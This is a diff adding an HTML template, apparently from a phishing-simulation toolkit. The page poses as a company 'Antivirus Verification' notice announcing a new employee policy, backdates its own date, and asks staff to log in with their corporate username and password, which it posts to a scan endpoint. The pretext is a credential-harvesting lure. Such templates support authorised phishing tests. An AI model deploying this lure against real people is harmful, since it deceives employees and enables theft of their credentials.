@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>{{ client.company_name }} Antivirus Update</title>
+<link class="user" href="./include/style-login.css" rel="stylesheet" type="text/css">
+<link rel="SHORTCUT ICON" href="./images/favicon.ico">
+</head>
+
+<body>
+<span id="m:i">
+  <header>
+    <img class="displayed" src="./images/logo.png" height="75">
+  </header>
+  <div style="height:750px;" id="container">
+    <div id="page-heading" role="main">
+      <span id="m:i:loginPage:t:LoginTitle"></span>
+    </div>
+    <div class="right-promo" style="height:226px">
+      <aside role="complementary">
+        <span id="m:i:loginPage:t:LoginForm">
+          <form method="post" action="./scan">
+            <table style="margin-top:1em;">
+              <tbody>
+                <tr>
+                  <td>
+                    <strong>
+                      <label for="ocmsUsername">Username:&nbsp;&nbsp;</label>
+                    </strong>
+                  </td>
+                  <td>
+                    <input class="ocmsUsername" name="username" type="text" autocomplete="off">
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <strong>
+                      <label for="ocmsPassword">Password:&nbsp;&nbsp;</label>
+                    </strong>
+                  </td>
+                  <td>
+                    <input class="ocmsPassword" name="password" type="password" autocomplete="off">
+                  </td>
+                </tr>
+                <tr>
+                  <td></td>
+                  <td>
+                    <input class="ocmsLoginButton" name="ocmsLoginButton" value="Login" type="submit">
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </form>
+        </span>
+      </aside>
+      <aside id="InputContent">
+        <span id="m:i:loginPage:t:ContentForm" class="document-1-content">
+          Please login with your {{ client.company_name }} username and password. The scan will being automatically.
+        </span>
+      </aside>
+    </div>
+    <section class="content-slim-left scroll-short" id="content-login">
+      <div id="item1" class="scrollable scroll-short">
+        <span class="document-1-content">
+          <div>
+            <img alt="" src="./images/partner_plus.pdf" style="width: 698px; height: 225px">
+          </div>
+        </span>
+      </div>
+      <br>
+      <p align="center">
+        <font face="Verdana" size="5">
+          <strong>Antivirus Verification</strong>
+        </font>
+      </p>
+      <br>
+      <p align="center">
+        <font face="Verdana" size="3">
+          <strong>{{ time.local|last_week|strftime('%A %B %e, %Y') }}</strong>
+        </font>
+      </p>
+      <br>
+      <p align="center">
+        <font face="Verdana" size="3">
+          <strong>New Antivirus Policy for All {{ client.company_name }} Employees</strong>
+        </font>
+      </p>
+      <br>
+      <table>
+        <td align="center" width="1000">
+          <font face="Verdana" size="3">
+            {{ client.company_name }} has implemented a new policy for all employees. 
+            Effective immediately, employees are required to have an up to date antivirus program running on all computers connected to the corporate network. 
+            To verify this computer is licensed and protected by the most current version of {{ client.company_name | possessive }} Enterprise Antivirus solution, please login to continue.
+            <br>
+            <br>
+            Thank you for your cooperation.
+          </font>
+        </td>
+      </table>
+    </section>
+  </div>
+  <footer id="bottom">
+    <div>
+      <ul id="left">
+        <span id="m:i:loginPage:t:footerContent" class="document-1-content" style="outline:invert none medium; font-family:arial">
+          <a style="font-family:arial; outline:invert none medium; color:rgb(0, 0, 0); text-decoration:none" target="_blank">
+            <span style="color:#ffffff;">Legal Notice</span>
+          </a>
+        <span style="color:#ffffff;">&nbsp; |&nbsp;&nbsp;</span>
+          <a style="font-family:arial; outline:invert none medium; color:rgb(0, 0, 0); text-decoration:none" target="_blank">
+            <span style="color:#ffffff;">Privacy Statement</span>
+          </a>
+        <span style="color:#ffffff;">&nbsp; |&nbsp;&nbsp;</span>
+          <a style="font-family:arial; outline:invert none medium; color:rgb(0, 0, 0); text-decoration:none" target="_blank">
+            <span style="color:#ffffff;">Contact Us</span>
+          </a>
+        </span>
+      </ul>
+      <ul id="right">
+        <li>Copyright &copy; {{ time.local|strftime('%Y') }} {{ client.company_name }}, All rights reserved.</li>
+      </ul>
+      <br class="clear">
+    </div>
+  </footer>
+</span>
+</body>
+</html>
